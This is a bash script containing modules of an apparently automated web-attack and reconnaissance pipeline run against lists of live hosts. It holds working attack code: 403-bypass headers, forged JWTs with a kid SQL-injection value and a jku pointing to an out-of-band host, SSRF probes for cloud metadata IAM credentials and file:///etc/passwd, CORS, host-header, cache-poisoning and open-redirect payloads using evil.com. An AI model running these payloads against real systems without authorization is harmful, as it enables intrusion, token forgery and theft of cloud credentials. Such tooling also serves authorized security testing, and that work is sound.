#!/bin/bash
# ══════════════════════════════════════════════════════
#  MOD 04: API Testing (FIXED — 403 bypass comparison)
#  MOD 05: Nuclei (FIXED — priority order, less FP)
#  MOD 06: Web Vulns (FIXED — JWT full suite, SSRF all clouds)
# ══════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════
#  MOD 04: API Security — FIXED issue #6 (FP control)
# ══════════════════════════════════════════════════════
mod_api() {
  log_section "MOD 04: API Security Testing"
  local A="$OUTPUT_DIR/vulns/api"
  mkdir -p "$A"
  local LIVE="$OUTPUT_DIR/subdomains/live.txt"
  [[ ! -f "$LIVE" ]] && return

  # kiterunner
  log_info "kiterunner API route bruteforce..."
  if cmd_exists kr; then
    for kite in /tmp/routes-large.kite /tmp/routes-small.kite; do
      [[ ! -f "$kite" ]] && wget -q \
        "https://wordlists-cdn.assetnote.io/data/kiterunner/$(basename $kite)" \
        -O "$kite" 2>/dev/null || true
    done
    KITE_WL=$( [[ -f /tmp/routes-large.kite ]] && echo /tmp/routes-large.kite || echo /tmp/routes-small.kite )
    [[ -f "$KITE_WL" ]] && \
      safe_run kr scan "$LIVE" -w "$KITE_WL" \
        -j "$A/kiterunner.json" \
        -x "$THREADS" --timeout "${TIMEOUT}s" \
        --fail-status-codes 400,401,404,405,406,408 2>/dev/null || true
  fi

  # ffuf API paths
  log_info "ffuf API fuzzing..."
  if cmd_exists ffuf; then
    cat > /tmp/api_routes.txt << 'APIEOF'
api api/v1 api/v2 api/v3 api/docs api/swagger api/openapi
api/graphql graphql api/auth api/login api/logout api/register
api/user api/users api/me api/profile api/admin api/config
api/health healthz status api/status actuator actuator/env
actuator/beans actuator/mappings swagger.json openapi.json
.well-known/openid-configuration .well-known/jwks.json
api/keys api/tokens api/search api/export api/upload
api/payments api/billing api/webhooks api/internal
APIEOF
    tr ' ' '\n' < /tmp/api_routes.txt | sed '/^$/d' > /tmp/api_clean.txt

    head -15 "$LIVE" | while read -r target; do
      ffuf -u "$target/FUZZ" -w /tmp/api_clean.txt \
        -mc 200,201,204,301,302,401,403,405 \
        -t "$THREADS" -timeout "$TIMEOUT" -s \
        -o "$A/ffuf_$(echo "$target" | md5sum | cut -c1-8).json" \
        -of json 2>/dev/null || true
    done

    cat "$A"/ffuf_*.json 2>/dev/null | \
      jq -r '.results[] | "\(.status) \(.url)"' 2>/dev/null | \
      sort -u > "$A/api_found.txt" || true
  fi

  # FIXED #6: 403 bypass with proper false-positive control
  # Compare baseline vs bypass: length, body hash, title must differ
  log_info "403 bypass (with FP control — content comparison)..."
  if [[ -f "$OUTPUT_DIR/subdomains/httpx_full.json" ]]; then
    jq -r 'select(.status_code==403) | .url' \
      "$OUTPUT_DIR/subdomains/httpx_full.json" 2>/dev/null | \
      head -30 | while IFS= read -r url; do

      # Baseline response
      BASELINE=$(curl -sk --max-time "$TIMEOUT" "$url" 2>/dev/null)
      BASELINE_LEN=${#BASELINE}
      BASELINE_HASH=$(echo "$BASELINE" | md5sum | cut -c1-8)
      BASELINE_TITLE=$(echo "$BASELINE" | grep -oiP '(?<=<title>)[^<]+' | head -1)

      BYPASS_HEADERS=(
        "X-Original-URL: /"
        "X-Rewrite-URL: /"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Host: localhost"
        "True-Client-IP: 127.0.0.1"
      )

      for h in "${BYPASS_HEADERS[@]}"; do
        BYPASS_RESP=$(curl -sk --max-time "$TIMEOUT" -H "$h" "$url" 2>/dev/null)
        BYPASS_CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "$h" \
          --max-time "$TIMEOUT" "$url" 2>/dev/null)
        BYPASS_LEN=${#BYPASS_RESP}
        BYPASS_HASH=$(echo "$BYPASS_RESP" | md5sum | cut -c1-8)
        BYPASS_TITLE=$(echo "$BYPASS_RESP" | grep -oiP '(?<=<title>)[^<]+' | head -1)

        # FIXED: only flag if code is 200 AND content actually changed
        if [[ "$BYPASS_CODE" == "200" ]] && \
           [[ "$BYPASS_HASH" != "$BASELINE_HASH" ]] && \
           [[ "$BYPASS_LEN" -gt 100 ]]; then
          log_finding "403 Bypass: $url | Header: $h"
          echo "[HIGH] $url | $h | len:$BYPASS_LEN (was:$BASELINE_LEN)" >> "$A/403_bypass.txt"
        fi
      done

      # Path tricks
      for path_trick in "//" "/./" "/%2f" "/%252f"; do
        B_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
          --max-time "$TIMEOUT" "${url}${path_trick}" 2>/dev/null)
        B_RESP=$(curl -sk --max-time "$TIMEOUT" \
          "${url}${path_trick}" 2>/dev/null)
        B_HASH=$(echo "$B_RESP" | md5sum | cut -c1-8)
        [[ "$B_CODE" == "200" ]] && [[ "$B_HASH" != "$BASELINE_HASH" ]] && \
          echo "[HIGH] ${url}${path_trick} (path trick)" >> "$A/403_bypass.txt"
      done
    done
  fi

  # HTTP method testing
  log_info "HTTP method testing..."
  grep "^200\|^201" "$A/api_found.txt" 2>/dev/null | \
    awk '{print $2}' | head -20 | while read -r endpoint; do
    for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
      STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        -X "$method" --max-time "$TIMEOUT" "$endpoint" 2>/dev/null)
      [[ "$STATUS" =~ ^(200|201|202|204) ]] && \
        echo "[$method] $STATUS $endpoint" >> "$A/methods.txt"
    done
  done

  log_info "API testing complete!"
}

# ══════════════════════════════════════════════════════
#  MOD 05: Nuclei — FIXED issue #9
#  Priority order: critical first, less FP
# ══════════════════════════════════════════════════════
mod_nuclei() {
  log_section "MOD 05: Nuclei Scanning (Priority Order)"
  local N="$OUTPUT_DIR/vulns/nuclei"
  mkdir -p "$N"
  local LIVE="$OUTPUT_DIR/subdomains/live.txt"
  [[ ! -f "$LIVE" ]] && return
  ! cmd_exists nuclei && { log_warn "nuclei not found"; return; }

  safe_run nuclei -update-templates -silent
  local -a NUC_BASE=(nuclei -l "$LIVE" -silent -c "$THREADS" -timeout "$TIMEOUT" -retries 1)

  # FIXED #9: priority order — critical things first, skip low-value first
  log_info "[1] CVE Critical (highest priority)..."
  safe_run "${NUC_BASE[@]}" -tags cve -severity critical -o "$N/cve_critical.txt"

  log_info "[2] CVE High..."
  safe_run "${NUC_BASE[@]}" -tags cve -severity high -o "$N/cve_high.txt"

  log_info "[3] Misconfigurations..."
  safe_run "${NUC_BASE[@]}" -tags misconfig -severity critical,high,medium -o "$N/misconfig.txt"

  log_info "[4] Exposures & Secrets..."
  safe_run "${NUC_BASE[@]}" -tags exposure,token -severity critical,high -o "$N/exposures.txt"

  log_info "[5] Default Credentials..."
  safe_run "${NUC_BASE[@]}" -tags default-login -o "$N/default_creds.txt"

  log_info "[6] Admin Panels..."
  safe_run "${NUC_BASE[@]}" -tags panel -o "$N/panels.txt"

  log_info "[7] Takeover templates..."
  safe_run "${NUC_BASE[@]}" -tags takeover -o "$N/takeover.txt"

  log_info "[8] SSRF..."
  safe_run "${NUC_BASE[@]}" -tags ssrf -o "$N/ssrf.txt"

  log_info "[9] SSTI..."
  safe_run "${NUC_BASE[@]}" -tags ssti -o "$N/ssti.txt"

  log_info "[10] LFI..."
  safe_run "${NUC_BASE[@]}" -tags lfi -o "$N/lfi.txt"

  log_info "[11] Cloud (AWS/GCP/Azure)..."
  safe_run "${NUC_BASE[@]}" -tags aws,gcp,azure,cloud,s3 -o "$N/cloud.txt"

  log_info "[12] Headless (JS-rendered)..."
  if command -v chromium-browser &>/dev/null || command -v chromium &>/dev/null; then
    safe_run "${NUC_BASE[@]}" -headless -tags headless -severity critical,high -o "$N/headless.txt"
  else
    log_warn "No Chrome/Chromium — skipping headless"
  fi

  # Custom templates
  log_info "[13] Custom templates..."
  mkdir -p /tmp/custom_nuclei

  cat > /tmp/custom_nuclei/env-exposure.yaml << 'YAML'
id: env-file-exposed
info:
  name: .env File Exposed
  severity: critical
  tags: exposure,secrets,env
requests:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.env.local"
      - "{{BaseURL}}/.env.production"
      - "{{BaseURL}}/.env.development"
      - "{{BaseURL}}/.env.backup"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["DB_","SECRET","KEY=","TOKEN=","PASSWORD=","API_"]
        condition: or
YAML

  cat > /tmp/custom_nuclei/nextjs-sourcemap.yaml << 'YAML'
id: nextjs-sourcemap
info:
  name: Next.js Source Map Exposed
  severity: medium
  tags: nextjs,exposure
requests:
  - method: GET
    path:
      - "{{BaseURL}}/_next/static/chunks/main.js.map"
      - "{{BaseURL}}/_next/static/chunks/pages/_app.js.map"
    matchers:
      - type: word
        words: ["mappings","sourcesContent"]
        condition: or
YAML

  cat > /tmp/custom_nuclei/graphql-introspection.yaml << 'YAML'
id: graphql-introspection
info:
  name: GraphQL Introspection Enabled
  severity: medium
  tags: graphql
requests:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"
      - "{{BaseURL}}/v1/graphql"
    headers:
      Content-Type: application/json
    body: '{"query":"{__schema{types{name}}}"}'
    matchers-condition: and
    matchers:
      - type: word
        words: ["__schema","types"]
      - type: status
        status: [200]
YAML

  cat > /tmp/custom_nuclei/spring-actuator.yaml << 'YAML'
id: spring-actuator-exposed
info:
  name: Spring Boot Actuator Exposed
  severity: high
  tags: spring,exposure
requests:
  - method: GET
    path:
      - "{{BaseURL}}/actuator"
      - "{{BaseURL}}/actuator/env"
      - "{{BaseURL}}/actuator/dump"
      - "{{BaseURL}}/actuator/beans"
    matchers:
      - type: word
        words: ["_links","activeProfiles","beans","environment"]
        condition: or
YAML

  safe_run nuclei -l "$LIVE" -t /tmp/custom_nuclei/ \
    -silent -c "$THREADS" -o "$N/custom.txt"

  TOTAL=$(cat "$N/"*.txt 2>/dev/null | grep -c "." || echo 0)
  log_info "Nuclei total: ${RED}$TOTAL${NC}"
}

# ══════════════════════════════════════════════════════
#  MOD 06: Web Vulnerabilities
#  FIXED: JWT full suite (#8), SSRF all clouds (#7)
# ══════════════════════════════════════════════════════
mod_web_vulns() {
  log_section "MOD 06: Web Vulnerabilities"
  local V="$OUTPUT_DIR/vulns"
  local LIVE="$OUTPUT_DIR/subdomains/live.txt"
  [[ ! -f "$LIVE" ]] && return

  # ── XSS ──────────────────────────────────────────────
  log_info "XSS — dalfox..."
  if cmd_exists dalfox; then
    [[ -s "$OUTPUT_DIR/urls/gf_xss.txt" ]] && \
      safe_run dalfox file "$OUTPUT_DIR/urls/gf_xss.txt" \
        --no-spinner --silence \
        -o "$V/xss/dalfox.txt" \
        --worker "$THREADS" --timeout "$TIMEOUT"

    grep '?' "$OUTPUT_DIR/urls/all_urls.txt" 2>/dev/null | head -300 | \
      safe_run dalfox pipe --no-spinner --silence \
        -o "$V/xss/dalfox_pipe.txt" \
        --worker "$THREADS" || true
  fi

  # ── CORS ─────────────────────────────────────────────
  log_info "CORS misconfiguration..."
  if cmd_exists corsy; then
    safe_run corsy -i "$LIVE" -t "$THREADS" \
      -o "$V/cors/corsy.json" 2>/dev/null || true
  fi
  CORS_ORIGINS=("https://evil.com" "null" "https://${DOMAIN}.evil.com" "http://localhost")
  head -30 "$LIVE" | while IFS= read -r url; do
    for origin in "${CORS_ORIGINS[@]}"; do
      RESP=$(curl -sk -I -H "Origin: $origin" \
        -H "Access-Control-Request-Method: GET" \
        --max-time "$TIMEOUT" "$url" 2>/dev/null)
      ACAO=$(echo "$RESP" | grep -i "access-control-allow-origin:" | head -1)
      ACAC=$(echo "$RESP" | grep -i "access-control-allow-credentials:" | head -1)
      if echo "$ACAO" | grep -qiE "evil\.com|null|${DOMAIN}\.evil"; then
        if echo "$ACAC" | grep -qi "true"; then
          log_finding "CORS+Credentials: $url | $origin"
          echo "[CRITICAL] $url | $origin" >> "$V/cors/critical.txt"
        else
          echo "[MEDIUM] $url | $origin" >> "$V/cors/medium.txt"
        fi
      fi
    done
  done

  # ── GraphQL ───────────────────────────────────────────
  log_info "GraphQL (graphw00f + full tests)..."
  cmd_exists graphw00f && \
    head -10 "$LIVE" | while read -r url; do
      safe_run graphw00f -t "$url" 2>/dev/null >> "$V/graphql/fingerprint.txt" || true
    done

  head -10 "$LIVE" | while IFS= read -r url; do
    for gql in "/graphql" "/api/graphql" "/v1/graphql" "/query" "/graphiql"; do
      GQL_URL="$url$gql"
      RESP=$(curl -sk --max-time "$TIMEOUT" \
        -H "Content-Type: application/json" \
        -d '{"query":"{__schema{types{name}}}"}' "$GQL_URL" 2>/dev/null)
      if echo "$RESP" | grep -q "__schema"; then
        log_finding "GraphQL Introspection: $GQL_URL"
        echo "[CRITICAL] Introspection: $GQL_URL" >> "$V/graphql/issues.txt"
        # Schema dump
        curl -sk --max-time "$TIMEOUT" \
          -H "Content-Type: application/json" \
          -d '{"query":"{ __schema { queryType{fields{name}} mutationType{fields{name}} } }"}' \
          "$GQL_URL" 2>/dev/null | jq '.' >> "$V/graphql/schema.json" 2>/dev/null || true
        # clairvoyance blind schema
        cmd_exists clairvoyance && \
          safe_run clairvoyance "$GQL_URL" \
            -o "$V/graphql/clairvoyance.json" 2>/dev/null || true
      fi
      # Batch attack
      curl -sk --max-time "$TIMEOUT" \
        -H "Content-Type: application/json" \
        -d '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]' \
        "$GQL_URL" 2>/dev/null | grep -q "__typename" && \
        echo "[HIGH] Batching: $GQL_URL" >> "$V/graphql/issues.txt" || true
    done
  done

  # ── JWT — FIXED #8: full attack suite ────────────────
  log_info "JWT testing (full attack suite)..."

  # OOB setup for JWT kid injection
  RAND=$(head -c8 /dev/urandom | xxd -p 2>/dev/null || echo "deadbeef12345678")
  OOB_HOST="${RAND}.oast.fun"

  head -20 "$LIVE" | while read -r url; do
    # Collect JWT from response
    JWT=$(curl -sk -I --max-time "$TIMEOUT" "$url" 2>/dev/null | \
      grep -oiP 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' | head -1)
    [[ -z "$JWT" ]] && continue

    echo "$url | $JWT" >> "$V/jwt/found.txt"
    HEADER=$(echo "$JWT" | cut -d'.' -f1 | \
      python3 -c "import sys,base64; d=sys.stdin.read().strip(); print(base64.b64decode(d+'=='*4).decode('utf-8','ignore'))" 2>/dev/null)
    ALG=$(echo "$HEADER" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('alg',''))" 2>/dev/null || echo "")

    # 1. alg:none
    [[ "$ALG" == "none" || "$ALG" == "None" ]] && \
      log_finding "JWT alg=none: $url" && \
      echo "[CRITICAL] alg=none: $url" >> "$V/jwt/none_alg.txt"

    # 2. HMAC candidate
    echo "$ALG" | grep -qi "HS" && \
      echo "[BRUTE] $url | $JWT" >> "$V/jwt/hmac_candidates.txt"

    # 3. FIXED #8: kid injection
    # kid parameter → SQL injection in key lookup
    KID_PAYLOAD=$(python3 -c "
import base64, json
h = json.loads('$HEADER') if '$HEADER' else {}
h['alg'] = 'HS256'
h['kid'] = \"' UNION SELECT 'secret'-- \"
enc = base64.b64encode(json.dumps(h).encode()).decode().rstrip('=')
print(enc)
" 2>/dev/null || echo "")
    if [[ -n "$KID_PAYLOAD" ]]; then
      PAYLOAD_ENC=$(echo "$JWT" | cut -d'.' -f2)
      FORGED="${KID_PAYLOAD}.${PAYLOAD_ENC}."
      STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $FORGED" \
        --max-time "$TIMEOUT" "$url/api/me" 2>/dev/null || echo "0")
      [[ "$STATUS" == "200" ]] && \
        log_finding "JWT kid SQLi: $url" && \
        echo "[CRITICAL] kid injection: $url" >> "$V/jwt/kid_injection.txt"
    fi

    # 4. jku injection (point to attacker-controlled JWKS)
    JKU_TOKEN=$(python3 -c "
import base64, json
h = {'alg':'RS256','typ':'JWT','jku':'http://$OOB_HOST/jwks.json'}
enc = base64.b64encode(json.dumps(h).encode()).decode().rstrip('=')
print(enc)
" 2>/dev/null || echo "")
    if [[ -n "$JKU_TOKEN" ]]; then
      PAYLOAD_ENC=$(echo "$JWT" | cut -d'.' -f2)
      curl -sk -o /dev/null --max-time "$TIMEOUT" \
        -H "Authorization: Bearer ${JKU_TOKEN}.${PAYLOAD_ENC}." \
        "$url/api/me" 2>/dev/null || true
      echo "[TEST] jku injection sent: $url → $OOB_HOST" >> "$V/jwt/jku_injection.txt"
    fi

    # 5. jwt_tool full suite
    if cmd_exists jwt_tool; then
      safe_run jwt_tool "$JWT" -M at \
        -o "$V/jwt/jwt_tool_$(echo "$url" | md5sum | cut -c1-8).txt" 2>/dev/null || true
    fi
  done

  # ── SSRF — FIXED #7: all cloud providers ─────────────
  log_info "SSRF (all cloud metadata endpoints)..."
  # FIXED #7: added GCP, Azure, Oracle, Alibaba, DigitalOcean
  SSRF_TARGETS=(
    "http://169.254.169.254/latest/meta-data/"                # AWS
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"  # AWS IAM
    "http://169.254.169.254/computeMetadata/v1/"              # GCP
    "http://metadata.google.internal/computeMetadata/v1/"     # GCP alt
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"  # Azure
    "http://100.100.100.200/latest/meta-data/"                # Alibaba Cloud
    "http://169.254.169.254/opc/v1/instance/"                 # Oracle Cloud
    "http://169.254.169.254/metadata/v1/"                     # DigitalOcean
    "http://192.168.0.1/"                                     # Internal router
    "http://127.0.0.1:8080/"                                  # Internal service
    "http://[::1]/"                                           # IPv6 loopback
    "http://localhost/"                                       # localhost
    "file:///etc/passwd"                                      # LFI via SSRF
  )

  SSRF_DETECT_PATTERNS="ami-id|instance-id|computeMetadata|local-ipv4|privateIpv4|instanceId|instance_id|root:x:|/bin/bash|metal|placement"

  [[ -s "$OUTPUT_DIR/urls/gf_ssrf.txt" ]] && \
    head -50 "$OUTPUT_DIR/urls/gf_ssrf.txt" | while read -r url; do
      BASE=$(echo "$url" | cut -d'?' -f1)
      PARAMS=$(echo "$url" | grep -oP '\?.*')
      for target in "${SSRF_TARGETS[@]}"; do
        ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$target'))" 2>/dev/null || echo "$target")
        RESP=$(curl -sk --max-time "$TIMEOUT" \
          "${BASE}?url=${ENC}&ssrf=${ENC}&path=${ENC}&redirect=${ENC}" 2>/dev/null)
        if echo "$RESP" | grep -qiE "$SSRF_DETECT_PATTERNS"; then
          log_finding "SSRF: $url → $target"
          echo "[CRITICAL] $url | $target" >> "$V/ssrf/ssrf.txt"
          break
        fi
      done
    done

  # ── Host Header Injection ─────────────────────────────
  log_info "Host Header Injection..."
  head -20 "$LIVE" | while IFS= read -r url; do
    for hval in "evil.com" "${DOMAIN}.evil.com" "127.0.0.1" "localhost"; do
      RESP=$(curl -sk -I --max-time "$TIMEOUT" \
        -H "Host: $hval" \
        -H "X-Forwarded-Host: $hval" \
        -H "X-Host: $hval" "$url" 2>/dev/null)
      echo "$RESP" | grep -qi "location:.*$hval\|$hval" && \
        log_finding "Host Header Injection: $url → $hval" && \
        echo "[HIGH] $url → $hval" >> "$V/misc/host_header.txt" || true
    done
  done

  # ── Cache Poisoning ───────────────────────────────────
  log_info "Cache Poisoning..."
  head -10 "$LIVE" | while IFS= read -r url; do
    UNIQ="cptest$(date +%s%N | md5sum | head -c8)"
    RESP=$(curl -sk --max-time "$TIMEOUT" \
      -H "X-Forwarded-Host: $UNIQ.evil.com" \
      -H "X-Host: $UNIQ.evil.com" "$url" 2>/dev/null)
    echo "$RESP" | grep -q "$UNIQ" && \
      log_finding "Cache Poisoning: $url" && \
      echo "[HIGH] $url" >> "$V/misc/cache_poisoning.txt" || true
  done

  # ── CRLF ─────────────────────────────────────────────
  log_info "CRLF Injection..."
  cmd_exists crlfuzz && \
    safe_run crlfuzz -l "$LIVE" -o "$V/misc/crlf.txt" -c "$THREADS" -s || true

  # ── Open Redirect ─────────────────────────────────────
  log_info "Open Redirect..."
  [[ -s "$OUTPUT_DIR/urls/gf_redirect.txt" ]] && \
    head -100 "$OUTPUT_DIR/urls/gf_redirect.txt" | while read -r url; do
      BASE=$(echo "$url" | cut -d'?' -f1)
      for p in "https://evil.com" "//evil.com" "/\\evil.com"; do
        RESP=$(curl -sk -I --max-time "$TIMEOUT" --max-redirs 0 \
          "${BASE}?url=$p&next=$p&redirect=$p&return=$p" 2>/dev/null)
        echo "$RESP" | grep -qi "location:.*evil.com" && \
          log_finding "Open Redirect: $BASE" && \
          echo "[HIGH] $BASE → $p" >> "$V/misc/redirect.txt" && break
      done
    done

  # ── Security Headers ──────────────────────────────────
  log_info "Security Headers..."
  head -20 "$LIVE" | while IFS= read -r url; do
    RESP=$(curl -sk -I --max-time "$TIMEOUT" "$url" 2>/dev/null | tr -d '\r')
    {
      echo "=== $url ==="
      for h in "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options" \
                "Strict-Transport-Security" "Referrer-Policy" "Permissions-Policy" \
                "X-XSS-Protection" "Cross-Origin-Opener-Policy"; do
        echo "$RESP" | grep -qi "^$h:" && echo "  ✓ $h" || echo "  ✗ MISSING: $h"
      done
      for il in "Server" "X-Powered-By" "X-AspNet-Version" "X-Generator" "X-Runtime"; do
        VAL=$(echo "$RESP" | grep -i "^$il:" | head -1)
        [[ -n "$VAL" ]] && echo "  ⚠ INFO-LEAK: $VAL"
      done
    } >> "$V/headers/analysis.txt" 2>/dev/null || true
  done

  log_info "Web vulnerabilities scan complete!"
}
